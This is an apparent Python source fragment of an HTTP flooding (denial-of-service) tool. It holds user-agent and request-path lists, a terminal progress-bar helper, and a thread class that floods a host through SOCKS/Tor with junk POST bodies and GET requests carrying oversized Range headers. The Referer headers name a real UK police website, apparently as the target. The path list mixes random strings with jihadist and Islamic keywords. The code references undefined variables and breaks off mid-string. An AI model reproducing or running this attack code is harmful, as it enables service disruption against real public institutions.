"Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
]

gets = [
        '3b42huhbreiuhbiuvhe4iruhotvbuher4it',
        'nv249u5h982h4359htr93w847thgf983w4heptofwhg98t43',
        'vi0542jnbvjn4ihb495ngvi84jhntgoiejg9oe',
        'gj4509ijhg48590hgrehghrengi8hre4ghw8r4hygi8hgregi89e4',
        'fnewvuiqwehbvcuiqwhfqh3wuiefbghiwqEFBNLIQWE',
        'vhedriuvheuoirohv8743hv78345hruygewo',
        '35684eb8ecw4rb84wrtb',
        'ebewrbwrteb78',
        'q5erg',
        'qejgho3iu4ohg3u4ih',
        'ejhgwuihoewuighvuivhduifbhvui',
        '57e5bge74g85',
        'wg54iheiorhgeu864br86574tbhr4ht65',
        'h6rt4hn68r4tehb68ec4bh68dsb4d68rt',
        'g4ewrv5b4e6r58tb4e6rt4b8',
        'index.php',
        'index',
        'index.html',
        'index.htm',
        'robots.txt',
        'weg54g4eg4ewghtwewrthr5ytjhnetjhwrtj6',
        '~/var/www/index.php',
        'weij98h34v5iu9hevh98u32hgvuh9ieqrv',
        'wbgiuehbovgu3bvuiberfjhvbeqibvlkiuerg',
        'vejnlvoiuerlvneriv685463498446nrewtn',
        'brwt56b4ry65jn4rjtnertj45yt4h/km5747nyu',
        'eovnjpq49834u39483h10gfh',
        '245gho23u7vhqerhv8q9whefoq4398',
        'ciuqwhvc9q384hvnbiuswnc93982u40hfsdoi',
        '34f445h442he4trhrtdhwtr4derhdre',
        'fweqhfiu3h4fhwq8hfwghfeiudeiurh',
        'a',
        'abandon',
        'abandoned',
        'ability',
        'able',
        'about',
        'above',
        'abroad',
        'absence',
        'absent',
        'absolute',
        'absolutely',
        'absorb',
        'abuse',
        'abuse',
        'academic',
        'accent',
        'accept',
        'acceptable',
        'access',
        'accident',
        'accidental',
        'accidentally',
        'accommodation',
        'accompany',
        'according',
        'account',
        'account',
        'accurate',
        'accurately',
        'accuse',
        'achieve',
        'achievement',
        'acid',
        'acknowledge',
        'couple',
        'acquire',
        'across',
        'act',
        'action',
        'active',
        'actively',
        'activity',
        'actor',
        'actress',
        'actual',
        'actually',
        'ad',
        'adapt',
        'add',
        'addition',
        'additional',
        'add',
        'address',
        'add',
        'up',
        'adequate',
        'adequately',
        'adjust',
        'admiraion',
        'admire ',
        'admit ',
        'adopt ',
        'adult',
        'advance',
        'advanced',
        'advantage',
        'adventure',
        'advert',
        'advertise',
        'advertisement',
        'advertising',
        'advice',
        'advise',
        'affair',
        'affect',
        'affection',
        'afford',
        'afraid',
        'after',
        'afternoon',
        'afterwards',
        'again',
        'against',
        'age',
        'aged',
        'agency',
        'agent',
        'aggressive',
        'ago',
        'agree',
        'agreement',
        'ahead',
        'aid',
        'aim',
        'air',
        'aircraft',
        'airport',
        'alarm',
        'alarmed',
        'isis',
        'jihad',
        'mujahid',
        'mujahideen',
        'main',
        'home',
        'hijrah',
        'baqiyah',
        'khilafah',
        'kahlifiah',
        'kalifa',
        'caliphate',
        'kahlifa',
        'sucession',
        'hajj',
        'islam',
        'is',
        'prayer',
        'religion',
        'gov',
        'terror',
        'jihad',
        'jihadi',
        'fajr',
        'jihadists',
        'jihadist',
        'salah',
        'koran',
        'quaran',
        'akhi',
        'ummah',
        'akhawan',
        'ameen',
        '?s=qeghq435rhe45j56',
        '?s=5j4567567edrfhret65uyh64u7h',
        '?s=42w5h2h2',
        '?s=758lk578l',
        '?s=76k467ket',
        '?s=456jh465j',
        '?s=5h243h52',
        '?s=5eh454e4',
        '?s=56ewjrw56',
        '?s=7k6478k6t',
        '?s=56j647',
        '?s=rewgw45hw45',
        '?s=56j867k58',
        '?s=36jnh57y6j',
        '?s=4b4t56nh567',
        '?s=5jt4yj65',
        '?s=34grqerg',
        '?s=h5rge3qhgq3wr5hy',
        '?s=245h42qerhg5r',
        '?s=qerg45g456h',
        '?s=w4e5gewrg',
        '?s=g24e3grgerg',
        '?s=ewrgerg54g',
        '?s=5rhrethwerg',
        '?s=gre34grth5yh',
        '?s=qegr34g3er',
        '?s=ergbg3245g',
        '?s=grebgeqrgvb',
        '?s=qe34g35g23g243g',
        '?s=ergergergewrg',
]

import sys, re

class TerminalController:
    """
    A class that can be used to portably generate formatted output to
    a terminal.  
    
    `TerminalController` defines a set of instance variables whose
    values are initialized to the control sequence necessary to
    perform a given action.  These can be simply included in normal
    output to the terminal:

        >>> term = TerminalController()
        >>> print 'This is '+term.GREEN+'green'+term.NORMAL

    Alternatively, the `render()` method can used, which replaces
    '${action}' with the string required to perform 'action':

        >>> term = TerminalController()
        >>> print term.render('This is ${GREEN}green${NORMAL}')

    If the terminal doesn't support a given action, then the value of
    the corresponding instance variable will be set to ''.  As a
    result, the above code will still work on terminals that do not
    support color, except that their output will not be colored.
    Also, this means that you can test whether the terminal supports a
    given action by simply testing the truth value of the
    corresponding instance variable:

        >>> term = TerminalController()
        >>> if term.CLEAR_SCREEN:
        ...     print 'This terminal supports clearning the screen.'

    Finally, if the width and height of the terminal are known, then
    they will be stored in the `COLS` and `LINES` attributes.
    """
    # Cursor movement:
    BOL = ''             #: Move the cursor to the beginning of the line
    UP = ''              #: Move the cursor up one line
    DOWN = ''            #: Move the cursor down one line
    LEFT = ''            #: Move the cursor left one char
    RIGHT = ''           #: Move the cursor right one char

    # Deletion:
    CLEAR_SCREEN = ''    #: Clear the screen and move to home position
    CLEAR_EOL = ''       #: Clear to the end of the line.
    CLEAR_BOL = ''       #: Clear to the beginning of the line.
    CLEAR_EOS = ''       #: Clear to the end of the screen

    # Output modes:
    BOLD = ''            #: Turn on bold mode
    BLINK = ''           #: Turn on blink mode
    DIM = ''             #: Turn on half-bright mode
    REVERSE = ''         #: Turn on reverse-video mode
    NORMAL = ''          #: Turn off all modes

    # Cursor display:
    HIDE_CURSOR = ''     #: Make the cursor invisible
    SHOW_CURSOR = ''     #: Make the cursor visible

    # Terminal size:
    COLS = None          #: Width of the terminal (None for unknown)
    LINES = None         #: Height of the terminal (None for unknown)

    # Foreground colors:
    BLACK = BLUE = GREEN = CYAN = RED = MAGENTA = YELLOW = WHITE = ''
    
    # Background colors:
    BG_BLACK = BG_BLUE = BG_GREEN = BG_CYAN = ''
    BG_RED = BG_MAGENTA = BG_YELLOW = BG_WHITE = ''
    
    _STRING_CAPABILITIES = """
    BOL=cr UP=cuu1 DOWN=cud1 LEFT=cub1 RIGHT=cuf1
    CLEAR_SCREEN=clear CLEAR_EOL=el CLEAR_BOL=el1 CLEAR_EOS=ed BOLD=bold
    BLINK=blink DIM=dim REVERSE=rev UNDERLINE=smul NORMAL=sgr0
    HIDE_CURSOR=cinvis SHOW_CURSOR=cnorm""".split()
    _COLORS = """BLACK BLUE GREEN CYAN RED MAGENTA YELLOW WHITE""".split()

    def __init__(self, term_stream=sys.stdout):
        """
        Create a `TerminalController` and initialize its attributes
        with appropriate values for the current terminal.
        `term_stream` is the stream that will be used for terminal
        output; if this stream is not a tty, then the terminal is
        assumed to be a dumb terminal (i.e., have no capabilities).
        """
        # Curses isn't available on all platforms
        try: import curses
        except: return

        # If the stream isn't a tty, then assume it has no capabilities.
        if not term_stream.isatty(): return

        # Check the terminal type.  If we fail, then assume that the
        # terminal has no capabilities.
        try: curses.setupterm()
        except: return

        # Look up numeric capabilities.
        self.COLS = curses.tigetnum('cols')
        self.LINES = curses.tigetnum('lines')
        
        # Look up string capabilities.
        for capability in self._STRING_CAPABILITIES:
            (attrib, cap_name) = capability.split('=')
            setattr(self, attrib, self._tigetstr(cap_name) or '')

        # Colors
        set_fg = self._tigetstr('setf')
        if set_fg:
            for i,color in zip(range(len(self._COLORS)), self._COLORS):
                setattr(self, color, curses.tparm(set_fg, i) or '')
        set_bg = self._tigetstr('setb')
        if set_bg:
            for i,color in zip(range(len(self._COLORS)), self._COLORS):
                setattr(self, 'BG_'+color, curses.tparm(set_bg, i) or '')

    def _tigetstr(self, cap_name):
        # String capabilities can include "delays" of the form "$<2>".
        # For any modern terminal, we should be able to just ignore
        # these, so strip them out.
        import curses
        cap = curses.tigetstr(cap_name) or ''
        return re.sub(r'\$<\d+>[/*]?', '', cap)

    def render(self, template):
        """
        Replace each $-substitutions in the given template string with
        the corresponding terminal control string (if it's defined) or
        '' (if it's not).
        """
        return re.sub(r'\$\$|\${\w+}', self._render_sub, template)

    def _render_sub(self, match):
        s = match.group()
        if s == '$$': return s
        else: return getattr(self, s[2:-1])

#######################################################################
# Example use case: progress bar
#######################################################################

class ProgressBar:
    """
    A 3-line progress bar, which looks like::
    
                                Header
        20% [===========----------------------------------]
                           progress message

    The progress bar is colored, if the terminal supports color
    output; and adjusts to the width of the terminal.
    """
    BAR = '%3d%% ${GREEN}[${BOLD}%s%s${NORMAL}${GREEN}]${NORMAL}\n'
    HEADER = '${BOLD}${CYAN}%s${NORMAL}\n\n'
        
    def __init__(self, term, header):
        self.term = term
        if not (self.term.CLEAR_EOL and self.term.UP and self.term.BOL):
            raise ValueError("Terminal isn't capable enough -- you "
                             "should use a simpler progress dispaly.")
        self.width = self.term.COLS or 75
        self.bar = term.render(self.BAR)
        self.header = self.term.render(self.HEADER % header.center(self.width))
        self.cleared = 0 
        self.update(0, '')

    def update(self, percent, message):
        if self.cleared:
            sys.stdout.write(self.header)
            self.cleared = 1
        n = int((self.width-10)*percent)
        sys.stdout.write(
            self.term.BOL + self.term.UP + self.term.CLEAR_EOL +
            (self.bar % (100*percent, '='*n, '-'*(self.width-10-n))) +
            self.term.CLEAR_EOL + message.center(self.width))

    def clear(self):
        if not self.cleared:
            sys.stdout.write(self.term.BOL + self.term.CLEAR_EOL +
                             self.term.UP + self.term.CLEAR_EOL +
                             self.term.UP + self.term.CLEAR_EOL)
            self.cleared = 1



term = TerminalController()

class httpGet(threading.Thread):
	def __init__(self, host, port, tor):
		Thread.__init__(self)
		self.host = host
		self.port = port
		self.socks = socks.socksocket()
		self.tor = tor
		self.running = True
		bytes="X"*65500
		bytes2="X"*randomint

	def _send_http_post(self, pause=5):
		global stop_now

		ss=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		self.socks.send("POST / HTTP/1.1\r\n"
		                "Host: %s\r\n"
		                "User-Agent: %s\r\n"
		                "Proxy-connection: keep-alive\r\n"
		                "Keep-Alive: 900\r\n"
		                "Content-Length: 10000\r\n"
		                "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
		                (self.host, random.choice(useragents)))
		for i in range(0, 9999):
			if stop_now:
				self.running = False
				break
			p = random.choice(string.letters+string.digits)
			data = ['\x00','\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00']
			packet = random.choice(data)
			print term.BOL+term.UP+term.CLEAR_EOL+"Requesting : %s/%s" % (self.host,random.choice(gets))+term.NORMAL
			magic = random.choice(packet+p)
			self.socks.send(magic)
			time.sleep(random.uniform(1, 3))
			self.socks.send("GET /%r HTTP/1.1\r\n"
			            "Host: %s\r\n"
			            "Proxy-connection: keep-alive\r\n"
			            "Keep-alive: 120\r\n"	
			            "User-Agent: %s\r\n" "Referer: https://www.northumbria.police.uk\r\n"
			            "Cache-Control: no-cache, max-age=0\r\n"
			            "Transfer-Encoding: chunked\r\n" 
			            "Accept-Ranges: bytes\r\n" 
			            "Range: bytes= 0-,1-0,1-1,1-2,1-3,1-4,1-5,1-6,1-7,1-8,1-9,1-10,1-11,1-12,1-13,1-14,1-15,1-16,1-17,1-18,1-19,1-20,1-21,1-22,1-23,1-24,1-25,1-26,1-27,1-28,1-29,1-30,1-31,1-32,1-33,1-34,1-35,1-36,1-37,1-38,1-39,1-40,1-41,1-42,1-43,1-44,1-45,1-46,1-47,1-48,1-49,1-50,1-51,1-52,1-53,1-54,1-55,1-56,1-57,1-58,1-59,1-60,1-61,1-62,1-63,1-64,1-65,1-66,1-67,1-68,1-69,1-70,1-71,1-72,1-73,1-74,1-75,1-76,1-77,1-78,1-79,1-80,1-81,1-82,1-83,1-84,1-85,1-86,1-87,1-88,1-89,1-90,1-91,1-92,1-93,1-94,1-95,1-96,1-97,1-98,1-99,1-100,1-101,1-102,1-103,1-104,1-105,1-106,1-107,1-108,1-109,1-110,1-111,1-112,1-113,1-114,1-115,1-116,1-117,1-118,1-119,1-120,1-121,1-122,1-123,1-124,1-125,1-126,1-127,1-128,1-129,1-130,1-131,1-132,1-133,1-134,1-135,1-136,1-137,1-138,1-139,1-140,1-141,1-142,1-143,1-144,1-145,1-146,1-147,1-148,1-149,1-150,1-151,1-152,1-153,1-154,1-155,1-156,1-157,1-158,1-159,1-160,1-161,1-162,1-163,1-164,1-165,1-166,1-167,1-168,1-169,1-170,1-171,1-172,1-173,1-174,1-175,1-176,1-177,1-178,1-179,1-180,1-181,1-182,1-183,1-184,1-185,1-186,1-187,1-188,1-189,1-190,1-191,1-192,1-193,1-194,1-195,1-196,1-197,1-198,1-199,1-200,1-201,1-202,1-203,1-204,1-205,1-206,1-207,1-208,1-209,1-210,1-211,1-212,1-213,1-214,1-215,1-216,1-217,1-218,1-219,1-220,1-221,1-222,1-223,1-224,1-225,1-226,1-227,1-228,1-229,1-230,1-231,1-232,1-233,1-234,1-235,1-236,1-237,1-238,1-239,1-240,1-241,1-242,1-243,1-244,1-245,1-246,1-247,1-248,1-249,1-250,1-251,1-252,1-253,1-254,1-255,1-256,1-257,1-258,1-259,1-260,1-261,1-262,1-263,1-264,1-265,1-266,1-267,1-268,1-269,1-270,1-271,1-272,1-273,1-274,1-275,1-276,1-277,1-278,1-279,1-280,1-281,1-282,1-283,1-284,1-285,1-286,1-287,1-288,1-289,1-290,1-291,1-292,1-293,1-294,1-295,1-296,1-297,1-298,1-299,1-300,1-301,1-302,1-303,1-304,1-305,1-306,1-307,1-308,1-309,1-310,1-311,1-312,1-313,1-314,1-315,1-316,1-317,1-318,1-319,1-320,1-321,1-322,1-323,1-324,1-325,1-326,1-327,1-328,1-329,1-330,1-331,1-332,1-333,1-334,1-335,1-336,1-337,1-338,1-339,1-340,1-341,1-342,1-343,1-344,1-345,1-346,1-347,1-348,1-349,1-350,1-351,1-352,1-353,1-354,1-355,1-356,1-357,1-358,1-359,1-360,1-361,1-362,1-363,1-364,1-365,1-366,1-367,1-368,1-369,1-370,1-371,1-372,1-373,1-374,1-375,1-376,1-377,1-378,1-379,1-380,1-381,1-382,1-383,1-384,1-385,1-386,1-387,1-388,1-389,1-390,1-391,1-392,1-393,1-394,1-395,1-396,1-397,1-398,1-399,1-400,1-401,1-402,1-403,1-404,1-405,1-406,1-407,1-408,1-409,1-410,1-411,1-412,1-413,1-414,1-415,1-416,1-417,1-418,1-419,1-420,1-421,1-422,1-423,1-424,1-425,1-426,1-427,1-428,1-429,1-430,1-431,1-432,1-433,1-434,1-435,1-436,1-437,1-438,1-439,1-440,1-441,1-442,1-443,1-444,1-445,1-446,1-447,1-448,1-449,1-450,1-451,1-452,1-453,1-454,1-455,1-456,1-457,1-458,1-459,1-460,1-461,1-462,1-463,1-464,1-465,1-466,1-467,1-468,1-469,1-470,1-471,1-472,1-473,1-474,1-475,1-476,1-477,1-478,1-479,1-480,1-481,1-482,1-483,1-484,1-485,1-486,1-487,1-488,1-489,1-490,1-491,1-492,1-493,1-494,1-495,1-496,1-497,1-498,1-499,1-500,1-501,1-502,1-503,1-504,1-505,1-506,1-507,1-508,1-509,1-510,1-511,1-512,1-513,1-514,1-515,1-516,1-517,1-518,1-519,1-520,1-521,1-522,1-523,1-524,1-525,1-526,1-527,1-528,1-529,1-530,1-531,1-532,1-533,1-534,1-535,1-536,1-537,1-538,1-539,1-540,1-541,1-542,1-543,1-544,1-545,1-546,1-547,1-548,1-549,1-550,1-551,1-552,1-553,1-554,1-555,1-556,1-557,1-558,1-559,1-560,1-561,1-562,1-563,1-564,1-565,1-566,1-567,1-568,1-569,1-570,1-571,1-572,1-573,1-574,1-575,1-576,1-577,1-578,1-579,1-580,1-581,1-582,1-583,1-584,1-585,1-586,1-587,1-588,1-589,1-590,1-591,1-592,1-593,1-594,1-595,1-596,1-597,1-598,1-599,1-600,1-601,1-602,1-603,1-604,1-605,1-606,1-607,1-608,1-609,1-610,1-611,1-612,1-613,1-614,1-615,1-616,1-617,1-618,1-619,1-620,1-621,1-622,1-623,1-624,1-625,1-626,1-627,1-628,1-629,1-630,1-631,1-632,1-633,1-634,1-635,1-636,1-637,1-638,1-639,1-640,1-641,1-642,1-643,1-644,1-645,1-646,1-647,1-648,1-649,1-650,1-651,1-652,1-653,1-654,1-655,1-656,1-657,1-658,1-659,1-660,1-661,1-662,1-663,1-664,1-665,1-666,1-667,1-668,1-669,1-670,1-671,1-672,1-673,1-674,1-675,1-676,1-677,1-678,1-679,1-680,1-681,1-682,1-683,1-684,1-685,1-686,1-687,1-688,1-689,1-690,1-691,1-692,1-693,1-694,1-695,1-696,1-697,1-698,1-699,1-700,1-701,1-702,1-703,1-704,1-705,1-706,1-707,1-708,1-709,1-710,1-711,1-712,1-713,1-714,1-715,1-716,1-717,1-718,1-719,1-720,1-721,1-722,1-723,1-724,1-725,1-726,1-727,1-728,1-729,1-730,1-731,1-732,1-733,1-734,1-735,1-736,1-737,1-738,1-739,1-740,1-741,1-742,1-743,1-744,1-745,1-746,1-747,1-748,1-749,1-750,1-751,1-752,1-753,1-754,1-755,1-756,1-757,1-758,1-759,1-760,1-761,1-762,1-763,1-764,1-765,1-766,1-767,1-768,1-769,1-770,1-771,1-772,1-773,1-774,1-775,1-776,1-777,1-778,1-779,1-780,1-781,1-782,1-783,1-784,1-785,1-786,1-787,1-788,1-789,1-790,1-791,1-792,1-793,1-794,1-795,1-796,1-797,1-798,1-799,1-800,1-801,1-802,1-803,1-804,1-805,1-806,1-807,1-808,1-809,1-810,1-811,1-812,1-813,1-814,1-815,1-816,1-817,1-818,1-819,1-820,1-821,1-822,1-823,1-824,1-825,1-826,1-827,1-828,1-829,1-830,1-831,1-832,1-833,1-834,1-835,1-836,1-837,1-838,1-839,1-840,1-841,1-842,1-843,1-844,1-845,1-846,1-847,1-848,1-849,1-850,1-851,1-852,1-853,1-854,1-855,1-856,1-857,1-858,1-859,1-860,1-861,1-862,1-863,1-864,1-865,1-866,1-867,1-868,1-869,1-870,1-871,1-872,1-873,1-874,1-875,1-876,1-877,1-878,1-879,1-880,1-881,1-882,1-883,1-884,1-885,1-886,1-887,1-888,1-889,1-890,1-891,1-892,1-893,1-894,1-895,1-896,1-897,1-898,1-899,1-900,1-901,1-902,1-903,1-904,1-905,1-906,1-907,1-908,1-909,1-910,1-911,1-912,1-913,1-914,1-915,1-916,1-917,1-918,1-919,1-920,1-921,1-922,1-923,1-924,1-925,1-926,1-927,1-928,1-929,1-930,1-931,1-932,1-933,1-934,1-935,1-936,1-937,1-938,1-939,1-940,1-941,1-942,1-943,1-944,1-945,1-946,1-947,1-948,1-949,1-950,1-951,1-952,1-953,1-954,1-955,1-956,1-957,1-958,1-959,1-960,1-961,1-962,1-963,1-964,1-965,1-966,1-967,1-968,1-969,1-970,1-971,1-972,1-973,1-974,1-975,1-976,1-977,1-978,1-979,1-980,1-981,1-982,1-983,1-984,1-985,1-986,1-987,1-988,1-989,1-990,1-991,1-992,1-993,1-994,1-995,1-996,1-997,1-998,1-999,1-1000,1-1001,1-1002,1-1003,1-1004,1-1005,1-1006,1-1007,1-1008,1-1009,1-1010,1-1011,1-1012,1-1013,1-1014,1-1015,1-1016,1-1017,1-1018,1-1019,1-1020,1-1021,1-1022,1-1023,1-1024,1-1025,1-1026,1-1027,1-1028,1-1029,1-1030,1-1031,1-1032,1-1033,1-1034,1-1035,1-1036,1-1037,1-1038,1-1039,1-1040,1-1041,1-1042,1-1043,1-1044,1-1045,1-1046,1-1047,1-1048,1-1049,1-1050,1-1051,1-1052,1-1053,1-1054,1-1055,1-1056,1-1057,1-1058,1-1059,1-1060,1-1061,1-1062,1-1063,1-1064,1-1065,1-1066,1-1067,1-1068,1-1069,1-1070,1-1071,1-1072,1-1073,1-1074,1-1075,1-1076,1-1077,1-1078,1-1079,1-1080,1-1081,1-1082,1-1083,1-1084,1-1085,1-1086,1-1087,1-1088,1-1089,1-1090,1-1091,1-1092,1-1093,1-1094,1-1095,1-1096,1-1097,1-1098,1-1099,1-1100,1-1101,1-1102,1-1103,1-1104,1-1105,1-1106,1-1107,1-1108,1-1109,1-1110,1-1111,1-1112,1-1113,1-1114,1-1115,1-1116,1-1117,1-1118,1-1119,1-1120,1-1121,1-1122,1-1123,1-1124,1-1125,1-1126,1-1127,1-1128,1-1129,1-1130,1-1131,1-1132,1-1133,1-1134,1-1135,1-1136,1-1137,1-1138,1-1139,1-1140,1-1141,1-1142,1-1143,1-1144,1-1145,1-1146,1-1147,1-1148,1-1149,1-1150,1-1151,1-1152,1-1153,1-1154,1-1155,1-1156,1-1157,1-1158,1-1159,1-1160,1-1161,1-1162,1-1163,1-1164,1-1165,1-1166,1-1167,1-1168,1-1169,1-1170,1-1171,1-1172,1-1173,1-1174,1-1175,1-1176,1-1177,1-1178,1-1179,1-1180,1-1181,1-1182,1-1183,1-1184,1-1185,1-1186,1-1187,1-1188,1-1189,1-1190,1-1191,1-1192,1-1193,1-1194,1-1195,1-1196,1-1197,1-1198,1-1199,1-1200,1-1201,1-1202,1-1203,1-1204,1-1205,1-1206,1-1207,1-1208,1-1209,1-1210,1-1211,1-1212,1-1213,1-1214,1-1215,1-1216,1-1217,1-1218,1-1219,1-1220,1-1221,1-1222,1-1223,1-1224,1-1225,1-1226,1-1227,1-1228,1-1229,1-1230,1-1231,1-1232,1-1233,1-1234,1-1235,1-1236,1-1237,1-1238,1-1239,1-1240,1-1241,1-1242,1-1243,1-1244,1-1245,1-1246,1-1247,1-1248,1-1249,1-1250,1-1251,1-1252,1-1253,1-1254,1-1255,1-1256,1-1257,1-1258,1-1259,1-1260,1-1261,1-1262,1-1263,1-1264,1-1265,1-1266,1-1267,1-1268,1-1269,1-1270,1-1271,1-1272,1-1273,1-1274,1-1275,1-1276,1-1277,1-1278,1-1279,1-1280,1-1281,1-1282,1-1283,1-1284,1-1285,1-1286,1-1287,1-1288,1-1289,1-1290,1-1291,1-1292,1-1293,1-1294,1-1295,1-1296,1-1297,1-1298,1-1299\r\n" 
			            "Accept-Encoding: gzip,deflate,compress\r\n\r\n" % 
			            (random.choice(gets), self.host, random.choice(useragents)))
			self.socks.send(magicoutput)			
			self.socks.send("GET /%r HTTP/1.1\r\n"
			            "Host: %s\r\n"
			            "Proxy-connection: keep-alive\r\n"
			            "Keep-alive: 120\r\n"	
			            "User-Agent: %s\r\n" "Referer:https://check-host.net/check-http?host=https://www.northumbria.police.uk\r\n"
			            "Cache-Control: no-cache, max-age=0\r\n"
			            "Transfer-Encoding: chunked\r\n" 
			            "Accept-Ranges: bytes\r\n" 
			            "Range: bytes= 0-,1-0,1-1,1-2,1-3,1-4,1-5,1-6,1-7,1-8,1-9,1-10,1-11,1-12,1-13,1-14,1-15,1-16,1-17,1-18,1-19,1-20,1-21,1-22,1-23,1-24,1-25,1-26,1-27,1-28,1-29,1-30,1-31,1-32,1-33,1-34,1-35,1-36,1-37,1-38,1-39,1-40,1-41,1-42,1-43,1-44,1-45,1-46,1-47,1-48,1-49,1-50,1-51,1-52,1-53,1-54,1-55,1-56,1-57,1-58,1-59,1-60,1-61,1-62,1-63,1-64,1-65,1-66,1-67,1-68,1-69,1-70,1-71,1-72,1-73,1-74,1-75,1-76,1-77,1-78,1-79,1-80,1-81,1-82,1-83,1-84,1-85,1-86,1-87,1-88,1-89,1-90,1-91,1-92,1-93,1-94,1-95,1-96,1-97,1-98,1-99,1-100,1-101,1-102,1-103,1-104,1-105,1-106,1-107,1-108,1-109,1-110,1-111,1-112,1-113,1-114,1-115,1-116,1-117,1-118,1-119,1-120,1-121,1-122,1-123,1-124,1-125,1-126,1-127,1-128,1-129,1-130,1-131,1-132,1-133,1-134,1-135,1-136,1-137,1-138,1-139,1-140,1-141,1-142,1-143,1-144,1-145,1-146,1-147,1-148,1-149,1-150,1-151,1-152,1-153,1-154,1-155,1-156,1-157,1-158,1-159,1-160,1-161,1-162,1-163,1-164,1-165,1-166,1-167,1-168,1-169,1-170,1-171,1-172,1-173,1-174,1-175,1-176,1-177,1-178,1-179,1-180,1-181,1-182,1-183,1-184,1-185,1-186,1-187,1-188,1-189,1-190,1-191,1-192,1-193,1-194,1-195,1-196,1-197,1-198,1-199,1-200,1-201,1-202,1-203,1-204,1-205,1-206,1-207,1-208,1-209,1-210,1-211,1-212,1-213,1-214,1-215,1-216,1-217,1-218,1-219,1-220,1-221,1-222,1-223,1-224,1-225,1-226,1-227,1-228,1-229,1-230,1-231,1-232,1-233,1-234,1-235,1-236,1-237,1-238,1-239,1-240,1-241,1-242,1-243,1-244,1-245,1-246,1-247,1-248,1-249,1-250,1-251,1-252,1-253,1-254,1-255,1-256,1-257,1-258,1-259,1-260,1-261,1-262,1-263,1-264,1-265,1-266,1-267,1-268,1-269,1-270,1-271,1-272,1-273,1-274,1-275,1-276,1-277,1-278,1-279,1-280,1-281,1-282,1-283,1-284,1-285,1-286,1-287,1-288,1-289,1-290,1-291,1-292,1-293,1-294,1-295,1-296,1-297,1-298,1-299,1-300,1-301,1-302,1-303,1-304,1-305,1-306,1-307,1-308,1-309,1-310,1-311,1-312,1-313,1-314,1-315,1-316,1-317,1-318,1-319,1-320,1-321,1-322,1-323,1-324,1-325,1-326,1-327,1-328,1-329,1-330,1-331,1-332,1-333,1-334,1-335,1-336,1-337,1-338,1-339,1-340,1-341,1-342,1-343,1-344,1-345,1-346,1-347,1-348,1-349,1-350,1-351,1-352,1-353,1-354,1-355,1-356,1-357,1-358,1-359,1-360,1-361,1-362,1-363,1-364,1-365,1-366,1-367,1-368,1-369,1-370,1-371,1-372,1-373,1-374,1-375,1-376,1-377,1-378,1-379,1-380,1-381,1-382,1-383,1-384,1-385,1-386,1-387,1-388,1-389,1-390,1-391,1-392,1-393,1-394,1-395,1-396,1-397,1-398,1-399,1-400,1-401,1-402,1-403,1-404,1-405,1-406,1-407,1-408,1-409,1-410,1-411,1-412,1-413,1-414,1-415,1-416,1-417,1-418,1-419,1-420,1-421,1-422,1-423,1-424,1-425,1-426,1-427,1-428,1-429,1-430,1-431,1-432,1-433,1-434,1-435,1-436,1-437,1-438,1-439,1-440,1-441,1-442,1-443,1-444,1-445,1-446,1-447,1-448,1-449,1-450,1-451,1-452,1-453,1-454,1-455,1-456,1-457,1-458,1-459,1-460,1-461,1-462,1-463,1-464,1-465,1-466,1-467,1-468,1-469,1-470,1-471,1-472,1-473,1-474,1-475,1-476,1-477,1-478,1-479,1-480,1-481,1-482,1-483,1-484,1-485,1-486,1-487,1-488,1-489,1-490,1-491,1-492,1-493,1-494,1-495,1-496,1-497,1-498,1-499,1-500,1-501,1-502,1-503,1-504,1-505,1-506,1-507,1-508,1-509,1-510,1-511,1-512,1-513,1-514,1-515,1-516,1-517,1-518,1-519,1-520,1-521,1-522,1-523,1-524,1-525,1-526,1-527,1-528,1-529,1-530,1-531,1-532,1-533,1-534,1-535,1-536,1-537,1-538,1-539,1-540,1-541,1-542,1-543,1-544,1-545,1-546,1-547,1-548,1-549,1-550,1-551,1-552,1-553,1-554,1-555,1-556,1-557,1-558,1-559,1-560,1-561,1-562,1-563,1-564,1-565,1-566,1-567,1-568,1-569,1-570,1-571,1-572,1-573,1-574,1-575,1-576,1-577,1-578,1-579,1-580,1-581,1-582,1-583,1-584,1-585,1-586,1-587,1-588,1-589,1-590,1-591,1-592,1-593,1-594,1-595,1-596,1-597,1-598,1-599,1-600,1-601,1-602,1-603,1-604,1-605,1-606,1-607,1-608,1-609,1-610,1-611,1-612,1-613,1-614,1-615,1-616,1-617,1-618,1-619,1-620,1-621,1-622,1-623,1-624,1-625,1-626,1-627,1-628,1-629,1-630,1-631,1-632,1-633,1-634,1-635,1-636,1-637,1-638,1-639,1-640,1-641,1-642,1-643,1-644,1-645,1-646,1-647,1-648,1-649,1-650,1-651,1-652,1-653,1-654,1-655,1-656,1-657,1-658,1-659,1-660,1-661,1-662,1-663,1-664,1-665,1-666,1-667,1-668,1-669,1-670,1-671,1-672,1-673,1-674,1-675,1-676,1-677,1-678,1-679,1-680,1-681,1-682,1-683,1-684,1-685,1-686,1-687,1-688,1-689,1-690,1-691,1-692,1-693,1-694,1-695,1-696,1-697,1-698,1-699,1-700,1-701,1-702,1-703,1-704,1-705,1-706,1-707,1-708,1-709,1-710,1-711,1-712,1-713,1-714,1-715,1-716,1-717,1-718,1-719,1-720,1-721,1-722,1-723,1-724,1-725,1-726,1-727,1-728,1-729,1-730,1-731,1-732,1-733,1-734,1-735,1-736,1-737,1-738,1-739,1-740,1-741,1-742,1-743,1-744,1-745,1-746,1-747,1-748,1-749,1-750,1-751,1-752,1-753,1-754,1-755,1-756,1-757,1-758,1-759,1-760,1